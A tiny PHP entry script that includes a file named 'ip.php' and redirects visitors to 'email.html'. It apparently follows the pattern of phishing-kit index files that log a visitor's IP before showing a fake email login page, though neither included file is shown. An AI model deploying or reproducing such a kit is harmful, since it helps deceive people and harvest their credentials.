<?php
include 'ip.php';
header('Location: email.html');
exit
?>
